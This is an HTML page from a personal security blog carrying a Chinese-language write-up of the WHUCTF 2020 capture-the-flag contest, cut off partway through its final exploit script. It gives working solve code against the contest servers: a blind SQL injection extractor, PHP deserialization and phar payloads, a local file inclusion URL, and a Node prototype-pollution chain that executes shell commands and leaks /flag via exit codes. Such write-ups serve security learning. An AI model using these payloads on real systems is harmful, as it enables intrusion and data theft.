@@ -1,0 +1,930 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <title>
+        WHUCTF 2020 WriteUp - Naivekun&#39;s blog
+      </title>
+    <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  
+  <meta name="theme-color" content="#000000" />
+  
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <meta name="description" content="Crypto Bivibivi from pwn import * r=remote(&amp;quot;218.197.154.9&amp;quot;,16387) r.recvline() po = r.recvline() import re nums_str = re.findall(&amp;quot;\d&#43;&amp;quot;,po) nums=[] for i in nums_str: nums.append(int(i)) ans=0 for i in range(10000): if (i*nums[0]&#43;nums[1] )%nums[3] == nums[2]%nums[3]: ans=i break r.recvuntil(&amp;quot;x :&amp;quot;) r.sendline(str(ans)) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() # r.interactive() table=&#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#39; tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r&#43;=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)&#43;add r=list(&#39;BV1 4" />
+  <meta name="generator" content="Hugo 0.70.0 with theme pure" />
+  <title>WHUCTF 2020 WriteUp - Naivekun&#39;s blog</title>
+  
+  
+  <link rel="stylesheet" href="https://naivekun.com/css/style.min.7dc20efbc53647d41aa9ddea0c48e59300223d084e66ea0cbe7c30bd88903acc.css">
+  
+  <link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/9.15.10/styles/github.min.css" async>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+  <meta property="og:title" content="WHUCTF 2020 WriteUp" />
+<meta property="og:description" content="Crypto Bivibivi from pwn import * r=remote(&quot;218.197.154.9&quot;,16387) r.recvline() po = r.recvline() import re nums_str = re.findall(&quot;\d&#43;&quot;,po) nums=[] for i in nums_str: nums.append(int(i)) ans=0 for i in range(10000): if (i*nums[0]&#43;nums[1] )%nums[3] == nums[2]%nums[3]: ans=i break r.recvuntil(&quot;x :&quot;) r.sendline(str(ans)) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() # r.interactive() table=&#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#39; tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r&#43;=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)&#43;add r=list(&#39;BV1 4" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://naivekun.com/2020/05/whuctf-2020-wp/" />
+<meta property="article:published_time" content="2020-05-29T20:36:11+00:00" />
+<meta property="article:modified_time" content="2020-05-29T20:36:11+00:00" />
+<meta itemprop="name" content="WHUCTF 2020 WriteUp">
+<meta itemprop="description" content="Crypto Bivibivi from pwn import * r=remote(&quot;218.197.154.9&quot;,16387) r.recvline() po = r.recvline() import re nums_str = re.findall(&quot;\d&#43;&quot;,po) nums=[] for i in nums_str: nums.append(int(i)) ans=0 for i in range(10000): if (i*nums[0]&#43;nums[1] )%nums[3] == nums[2]%nums[3]: ans=i break r.recvuntil(&quot;x :&quot;) r.sendline(str(ans)) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() # r.interactive() table=&#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#39; tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r&#43;=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)&#43;add r=list(&#39;BV1 4">
+<meta itemprop="datePublished" content="2020-05-29T20:36:11&#43;00:00" />
+<meta itemprop="dateModified" content="2020-05-29T20:36:11&#43;00:00" />
+<meta itemprop="wordCount" content="2119">
+
+
+
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="WHUCTF 2020 WriteUp"/>
+<meta name="twitter:description" content="Crypto Bivibivi from pwn import * r=remote(&quot;218.197.154.9&quot;,16387) r.recvline() po = r.recvline() import re nums_str = re.findall(&quot;\d&#43;&quot;,po) nums=[] for i in nums_str: nums.append(int(i)) ans=0 for i in range(10000): if (i*nums[0]&#43;nums[1] )%nums[3] == nums[2]%nums[3]: ans=i break r.recvuntil(&quot;x :&quot;) r.sendline(str(ans)) r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() r.recvline() # r.interactive() table=&#39;fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF&#39; tr={} for i in range(58): tr[table[i]]=i s=[11,10,3,8,4,6] xor=177451812 add=8728348608 def dec(x): r=0 for i in range(6): r&#43;=tr[x[s[i]]]*58**i return (r-add)^xor def enc(x): x=(x^xor)&#43;add r=list(&#39;BV1 4"/>
+
+  <!--[if lte IE 9]>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+    <![endif]-->
+
+  <!--[if lt IE 9]>
+      <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+      <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+    <![endif]-->
+
+</head>
+  </head>
+
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="https://github.com/naivekun" target="_blank">
+            <img class="img-circle img-rotate" src="https://naivekun.com/avatar.jpg" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">naivekun</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFer</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Wuhan, China</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
+            </div>
+        </div>
+    </form>
+</div>
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Archives</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-categories">
+                <a href="/categories/">
+                    <i class="icon icon-folder"></i>
+                  <span class="menu-title">Categories</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-friends">
+                <a href="/friends/">
+                    <i class="icon icon-friendship"></i>
+                  <span class="menu-title">Friends</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
+
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content"><script src="https://www.hackthebox.eu/badge/60818"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+      <div class="widget">
+    <h3 class="widget-title"> Categories</h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://naivekun.com/categories/ctf/" class="category-list-link">ctf</a><span class="category-list-count">1</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/hackthebox/" class="category-list-link">hackthebox</a><span class="category-list-count">13</span></li>
+            <li class="category-list-item"><a href="https://naivekun.com/categories/vulnhub/" class="category-list-link">vulnhub</a><span class="category-list-count">21</span></li>
+        </ul>
+    </div>
+</div>
+      <div class="widget">
+    <h3 class="widget-title"> Tags</h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/ctf/" class="tag-list-link">ctf</a><span
+                    class="tag-list-count">2</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/hackthebox/" class="tag-list-link">hackthebox</a><span
+                    class="tag-list-count">13</span></li>
+            
+            
+            <li class="tag-list-item"><a href="https://naivekun.com/tags/vulnhub/" class="tag-list-link">vulnhub</a><span
+                    class="tag-list-count">21</span></li>
+            
+        </ul>
+
+    </div>
+</div>
+      
+<div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2021/12/ma5671a-flash-openwrt/" class="title">68块钱MA5671A猫棒刷Openwrt</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2021-12-09 02:46:52 &#43;0800 &#43;0800" itemprop="datePublished">2021-12-09</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/10/hack-on-nrf/" class="title">nRF51系列单片机读取保护绕过</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-10-03 23:58:09 &#43;0800 &#43;0800" itemprop="datePublished">2020-10-03</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/08/hack-bmc/" class="title">一次对服务器主板IPMI BMC的漏洞挖掘</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-08-19 01:58:07 &#43;0800 &#43;0800" itemprop="datePublished">2020-08-19</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399-more/" class="title">TN3399板子填坑</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-23 18:03:36 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-23</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://naivekun.com/2020/07/tn3399/" class="title">闲鱼便宜板子TN3399折腾全攻略</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-07-14 16:51:10 &#43;0800 &#43;0800" itemprop="datePublished">2020-07-14</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Catalogue</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h1 itemprop="name">
+  <a
+    class="article-title"
+    href="/2020/05/whuctf-2020-wp/"
+    >WHUCTF 2020 WriteUp</a
+  >
+</h1>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://naivekun.com/2020/05/whuctf-2020-wp/" class="article-date">
+  <time datetime="2020-05-29 20:36:11 &#43;0000 UTC" itemprop="datePublished">2020-05-29</time>
+</a>
+</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i>&nbsp;<a href="/2020/05/whuctf-2020-wp/#comments"
+            class="article-comment-link">Comments</a></span>
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 2119words</span>
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 5minutes </span>
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <h1 id="crypto">Crypto</h1>
+<h2 id="bivibivi">Bivibivi</h2>
+<pre><code>from pwn import *
+
+r=remote(&quot;218.197.154.9&quot;,16387)
+r.recvline()
+po = r.recvline()
+
+import re
+nums_str = re.findall(&quot;\d+&quot;,po)
+nums=[]
+for i in nums_str:
+    nums.append(int(i))
+
+ans=0
+for i in range(10000):
+    if (i*nums[0]+nums[1] )%nums[3] == nums[2]%nums[3]:
+        ans=i
+        break
+
+r.recvuntil(&quot;x :&quot;)
+r.sendline(str(ans))
+r.recvline()
+r.recvline()
+r.recvline()
+r.recvline()
+r.recvline()
+r.recvline()
+# r.interactive()
+
+table='fZodR9XQDSUm21yCkr6zBqiveYah8bt4xsWpHnJE7jL5VG3guMTKNPAwcF'
+tr={}
+for i in range(58):
+	tr[table[i]]=i
+s=[11,10,3,8,4,6]
+xor=177451812
+add=8728348608
+
+def dec(x):
+	r=0
+	for i in range(6):
+		r+=tr[x[s[i]]]*58**i
+	return (r-add)^xor
+
+def enc(x):
+	x=(x^xor)+add
+	r=list('BV1  4 1 7  ')
+	for i in range(6):
+		r[s[i]]=table[x//58**i%58]
+	return ''.join(r)
+
+for i in range(5):
+    avid = int(r.recvline())
+    r.sendline(enc(avid))
+
+r.recvline()
+r.recvline()
+r.recvline()
+while 1:
+    bvid = r.recvline().strip()
+    if bvid[0:2]!=&quot;BV&quot;:
+        break
+    r.sendline(str(dec(bvid)))
+
+r.interactive()
+</code></pre>
+<h1 id="web">Web</h1>
+<h2 id="easy_sqli">Easy_sqli</h2>
+<p>裸的布尔盲注</p>
+<p>闲的蛋疼自己搓了个注入脚本玩玩</p>
+<pre><code>import requests
+import string
+import copy
+
+
+payload = {
+    &quot;user&quot;: &quot;asdasd\\&quot;,
+    &quot;pass&quot;: &quot; || if(ascii(mid((SELECT_STATEMENT),CHAR_OFFSET,1))=ASCII_CHAR,1,0) || 'a'='asdads&quot;
+}
+payload2 = {
+    &quot;user&quot;: &quot;asdasd\\&quot;,
+    &quot;pass&quot;: &quot; || if(ascii(mid((SELECT_STATEMENT),CHAR_OFFSET,1))&gt;ASCII_CHAR,1,0) || 'a'='asdads&quot;
+}
+
+
+def test_if_true(sql, char, offset):
+    url = &quot;http://218.197.154.9:10011/login.php&quot;
+    p = copy.deepcopy(payload)
+    p[&quot;pass&quot;] = p[&quot;pass&quot;].replace(&quot;SELECT_STATEMENT&quot;, sql).replace(&quot;CHAR_OFFSET&quot;, str(offset)).replace(&quot;ASCII_CHAR&quot;, str(ord(char)))
+    r=requests.post(url, data=p)
+    if &quot;Login success&quot; in r.text:
+        return True
+    return False
+
+def test_if_greater(sql, char, offset):
+    url = &quot;http://218.197.154.9:10011/login.php&quot;
+    p = copy.deepcopy(payload2)
+    p[&quot;pass&quot;] = p[&quot;pass&quot;].replace(&quot;SELECT_STATEMENT&quot;, sql).replace(&quot;CHAR_OFFSET&quot;, str(offset)).replace(&quot;ASCII_CHAR&quot;, str(ord(char)))
+    r=requests.post(url, data=p)
+    if &quot;Login success&quot; in r.text:
+        return True
+    return False
+
+while 1:
+    # sql = input()
+    # sql = &quot;select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name = 'f1ag_y0u_wi1l_n3ver_kn0w'&quot;
+    sql = &quot;select concat_ws(',',f111114g) from f1ag_y0u_wi1l_n3ver_kn0w&quot;
+    if &quot;select&quot; in sql:
+        sql = sql.replace(&quot;select&quot;, &quot;seselectlect&quot;)
+    if &quot;or&quot; in sql:
+        sql = sql.replace(&quot;or&quot;, &quot;oorr&quot;)
+    if &quot;from&quot; in sql:
+        sql = sql.replace(&quot;from&quot;, &quot;frfromom&quot;)
+    if &quot;where&quot; in sql:
+        sql = sql.replace(&quot;where&quot;, &quot;whwhereere&quot;)
+    offset = 1
+    res = &quot;&quot;
+    while 1:
+        l=0
+        r=255
+
+        while l&lt;r:
+            mid = int((l+r)/2)
+            result = test_if_true(sql, chr(mid), offset)
+            if result:
+                res+=chr(mid)
+                print(res)
+                offset+=1
+                break
+            else:
+                if test_if_greater(sql, chr(mid), offset):
+                    l=mid+1
+                else:
+                    r=mid
+
+</code></pre>
+<h2 id="ezphp">ezphp</h2>
+<p>审代码</p>
+<pre><code>&lt;?php
+error_reporting(0);
+highlight_file(__file__);
+$string_1 = $_GET['str1'];
+$string_2 = $_GET['str2'];
+
+//1st
+if($_GET['num'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['num'])){
+    echo '1st ok'.&quot;&lt;br&gt;&quot;;
+}
+else{
+    die('会代码审计嘛23333');
+}
+
+
+//2nd
+if(is_numeric($string_1)){
+    $md5_1 = md5($string_1);
+    $md5_2 = md5($string_2);
+
+    if($md5_1 != $md5_2){
+        $a = strtr($md5_1, 'pggnb', '12345');
+        $b = strtr($md5_2, 'pggnb', '12345');
+        if($a == $b){
+            echo '2nd ok'.&quot;&lt;br&gt;&quot;;
+        }
+        else{
+            die(&quot;can u give me the right str???&quot;);
+        }
+    } 
+    else{
+        die(&quot;no!!!!!!!!&quot;);
+    }
+}
+else{
+    die('is str1 numeric??????');
+}
+
+//3nd
+function filter($string){
+    return preg_replace('/x/', 'yy', $string);
+}
+
+$username = $_POST['username'];
+
+$password = &quot;aaaaa&quot;;
+$user = array($username, $password);
+
+$r = filter(serialize($user));
+if(unserialize($r)[1] == &quot;123456&quot;){
+    echo file_get_contents('flag.php');
+} 
+</code></pre>
+<p>第一个后面加<code>\n</code></p>
+<p>第二个爆破，会把b替换成5，所以找个0e+纯数字的和0e+纯数字+b的</p>
+<p>脚本</p>
+<pre><code>import hashlib
+
+def md5(s):
+	return hashlib.md5(s.encode(encoding='UTF-8')).hexdigest()
+
+for i in range(1,99999999):
+    flag = 1
+    j = md5(str(i))
+    if j[0:2] == '0e':
+        for z in j[2:]:
+            if z not in &quot;0123456789b&quot;:
+                flag = 0
+                break
+        if flag == 1:
+            print &quot;------------------md5(&quot;+str(i)+&quot;)=&quot;+j
+            break
+</code></pre>
+<p>第三个反序列化逃逸</p>
+<pre><code>$username = 'axxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;123456&quot;;}';
+$password = &quot;aaaaa&quot;;
+</code></pre>
+<h2 id="ezcmd">ezcmd</h2>
+<pre><code>&lt;?php
+if(isset($_GET['ip'])){
+  $ip = $_GET['ip'];
+  if(preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{1f}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match)){
+    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x{00}-\x{20}]|\&gt;|\'|\&quot;|\\|\(|\)|\[|\]|\{|\}/&quot;, $ip, $match);
+    die(&quot;fxck your symbol!&quot;);
+  } else if(preg_match(&quot;/ /&quot;, $ip)){
+    die(&quot;no space!&quot;);
+  } else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip)){
+    die(&quot;no flag&quot;);
+  } else if(preg_match(&quot;/tac|rm|echo|cat|nl|less|more|tail|head/&quot;, $ip)){
+    die(&quot;cat't read flag&quot;);
+  }
+  $a = shell_exec(&quot;ping -c 4 &quot;.$ip); 
+  echo &quot;&lt;pre&gt;&quot;;
+  print_r($a);
+}
+highlight_file(__FILE__);
+
+?&gt; 
+</code></pre>
+<p>命令注入
+过滤了一堆
+空格用<code>$IFS</code></p>
+<p>555忘了当时咋做了，好像是利用ping的输出传给bash&hellip;..</p>
+<p>后面再补</p>
+<h2 id="ezinclude">ezinclude</h2>
+<p>裸的文件包含</p>
+<p>稍微脑洞一下有个file参数</p>
+<p><code>http://218.197.154.9:10017/thankyou.php?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
+<h2 id="easy_unserialize">Easy_unserialize</h2>
+<p>打开是个上传</p>
+<p>发现这个玩意</p>
+<p><code>http://218.197.154.9:10010/?acti0n=upload</code></p>
+<p>lfi获取源码</p>
+<pre><code>class View
+	{
+		public $dir;
+		private $cmd;
+
+		function __construct()
+		{
+			$this-&gt;dir = 'upload/'.md5($_SERVER['REMOTE_ADDR']).'/';
+			$this-&gt;cmd = 'echo &quot;&lt;div style=\&quot;text-align: center;position: absolute;left: 0;bottom: 0;width: 100%;height: 30px;\&quot;&gt;Powered by: xxx&lt;/div&gt;&quot;;';
+			if(!is_dir($this-&gt;dir)) {
+				mkdir($this-&gt;dir, 0777, true);
+			}
+		}
+
+		function get_file_list() {
+			$file = scandir('.');
+			return $file;
+		}
+
+		function show_file_list() {
+			$file = $this-&gt;get_file_list();
+			for ($i = 2; $i &lt; sizeof($file); $i++) { 
+				echo &quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;[&quot;.strval($i - 1).&quot;]  $file[$i] &lt;/p&gt;&quot;;
+			}
+		}
+
+		function show_img($file_name) {
+			$name = $file_name;
+			$width = getimagesize($name)[0];
+			$height = getimagesize($name)[1];
+			$times = $width / 200;
+			$width /= $times;
+			$height /= $times;
+			$template = &quot;&lt;img style=\&quot;clear: both;display: block;margin: auto;\&quot; src=\&quot;$this-&gt;dir$name\&quot; alt=\&quot;$file_name\&quot; width = \&quot;$width\&quot; height = \&quot;$height\&quot;&gt;&quot;;
+			echo $template;
+		}
+
+		function delete_img($file_name) {
+			$name = $file_name;
+			if (file_exists($name)) {
+				@unlink($name);
+				if(!file_exists($name)) {
+					echo &quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;成功删除! 3s后跳转&lt;/p&gt;&quot;;
+					header(&quot;refresh:3;url=view.php&quot;);
+				} else {
+					echo &quot;Can not delete!&quot;;
+					exit;
+				}
+			} else {
+				echo &quot;&lt;p align=\&quot;center\&quot; style=\&quot;font-weight: bold;\&quot;&gt;找不到这个文件! &lt;/p&gt;&quot;;
+			}
+		}
+
+		function __destruct() {
+			eval($this-&gt;cmd);
+		}
+	}
+</code></pre>
+<p>有个类，那显然就是phar反序列化了</p>
+<p>exp</p>
+<pre><code>$exp=new View();
+echo serialize($exp);
+
+$phar = new Phar(&quot;vul.phar&quot;);
+$phar-&gt;startBuffering();
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;setStub(&quot;GIF89a&lt;?php__HALT_COMPILER(); ?&gt;&quot;);
+$phar-&gt;setMetadata($exp);
+$phar-&gt;stopBuffering();
+</code></pre>
+<p>把生成的vul.phar传上去然后</p>
+<pre><code>POST /view.php
+
+show=phar://vul.phar&amp;cmd=phpinfo&amp;args=0
+</code></pre>
+<h2 id="happygame">HappyGame</h2>
+<p>神仙题目</p>
+<p>node审计</p>
+<p>拿到源码</p>
+<p><img src="https://naivekun.com/images/2020-05-30-00-59-54.png" alt="image"></p>
+<p>首先merge有问题，可以原型污染</p>
+<p><img src="https://naivekun.com/images/2020-05-30-01-00-31.png" alt="image"></p>
+<p>试了下<code>{&quot;score&quot;: {&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;__proto__&quot;:{&quot;asd&quot;:&quot;blabla&quot;}}}}}</code>即可污染</p>
+<p>然后unserialize的时候<code>for xxx in obj</code>就可以控制传入eval的东西</p>
+<p><img src="https://naivekun.com/images/2020-05-30-01-03-20.png" alt="image"></p>
+<p>eval过滤了一大堆</p>
+<pre><code>const validCode = function (func_code){
+  let validInput = /process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base64|&quot;|'|\[|\+|\*/ig;
+  return !validInput.test(func_code);
+};
+
+const validInput = function (input){
+  // filter bad input
+  let validInput = /process|child_process|main|require|exec|this|function/ig;
+  ins = serialize(input);
+  return !validInput.test(ins);
+};
+</code></pre>
+<p>QAQ后来看了WP才知道可以直接绕，</p>
+<pre><code>Buffer.constructor(Buffer.from(`72657475726e2070726f636573732e6d61696e4d6f64756c652e636f6e7374727563746f722e5f6c6f616428276368696c645f70726f6365737327292e6578656353796e6328276c73202f27292e746f537472696e672829`, `he\\x78`))()
+</code></pre>
+<p>这里用了个玄学方法，没去绕过滤</p>
+<p>注意到题目import了opn模块，看下是啥</p>
+<p><img src="/images/2020-05-30-09-16-56.png" alt="image"></p>
+<p>发现可以直接运行命令</p>
+<p>但是拿不到输出，测了半天不出网</p>
+<p>于是看了看node的<code>child_process.spawn</code>，只需要<code>xxx.on('data',(r)=&gt;{写东西})</code></p>
+<p>但是有个问题，opn是async，所以会返回一个Promise，但是父函数不是async没法await，本地测了一下没法一次带外，可以先on data那里写进本地某个变量，第二个payload再把banner替换掉</p>
+<p>看下opn源码发现windows没啥问题，linux返回的childprocess的 被关了。。。透</p>
+<p><img src="/images/2020-05-30-09-24-07.png" alt=""></p>
+<p>如果上面options.wait为真，下面返回的就是<code>once('close')</code>之后的subprocess，此时subprocess已关闭，拿不到输出。</p>
+<p>如果把options.wait写成假，上面就会把<code>childProcessOptions.stdio</code>设成<code>ignore</code>，还是拿不到输出。。。</p>
+<p>emmm好像搞不了</p>
+<p>再仔细看一下，发现on error的时候会返回一个状态码</p>
+<p><img src="/images/2020-05-30-09-27-43.png" alt=""></p>
+<p>如果<code>exitCode</code>不是0，就把exitCode返回。</p>
+<p>这个时候reject就可以catch一下然后把banner改掉了</p>
+<pre><code>a=Array();
+a.push(`bash`);
+a.push(`-c`);
+var out=Array();
+var sp=opn(`echo BASE64_HERE | /usr/bin/bas?64 -d &gt; /tmp/naivekun;a=$(cat /tmp/naivekun);exit $a`,
+    {app:a,wait:true}
+);
+sp.catch((j)=&gt;{
+    console.log(j);
+    logs.aaaac=j.toString();
+    console.log(`FUCK`);
+});
+obj.banner=`fuckyou`;
+</code></pre>
+<p>emmm，这个状态码是命令执行可控的</p>
+<p>做个测试</p>
+<pre><code>whoami;exit 66
+</code></pre>
+<p><code>echo $?</code>可以得到66</p>
+<p>所以数据可以这么带外</p>
+<ul>
+<li>执行命令，设法获取输出，依次把每一位转化成0-255的ascii码，然后exit</li>
+<li>把exit的值on error带出来</li>
+<li>把带出来的值给写道某个全局变量里面</li>
+<li>第二次把这个全局变量替换成banner输出</li>
+</ul>
+<p>这样一次带一位出来，从而获得完整的执行命令的值</p>
+<p>首先测下有啥东西</p>
+<p>找不到东西会返回exit code 127</p>
+<p>跑炸了会出个1还是啥，测了下，python有。所以</p>
+<pre><code>payload0 = &quot;python -c \&quot;import subprocess;a=subprocess.check_output(['cat','/flag']);print int(ord(a[OFFSET]))\&quot;&quot;
+</code></pre>
+<p>命令过滤了一堆可以<code>echo xxx | bas?64 -d | bash</code></p>
+<p>exp</p>
+<pre><code>import requests
+import base64
+import re
+import time
+import sys
+
+payload0 = &quot;python -c \&quot;import subprocess;a=subprocess.check_output(['cat','/flag']);print int(ord(a[OFFSET]))\&quot;&quot;
+payload1 = r'{&quot;score&quot;: {&quot;constructor&quot;:{&quot;prototype&quot;:{&quot;__proto__&quot;:{&quot;asd&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{a=Array();a.push(`bash`);a.push(`-c`);var out=Array();var sp=opn(`echo BASE64_HERE | /usr/bin/bas?64 -d &gt; /tmp/naivekun;a=$(cat /tmp/naivekun);exit $a`,{app:a,wait:true});sp.catch((j)=&gt;{console.log(j);logs.aaaac=j.toString();console.log(`FUCK`);});obj.banner=`fuckyou`;return `asd`})()&quot;,&quot;wait&quot;:&quot;_$$ND_FUNC$$_(()=&gt;{})&quot;}}},&quot;length&quot;:1}}'
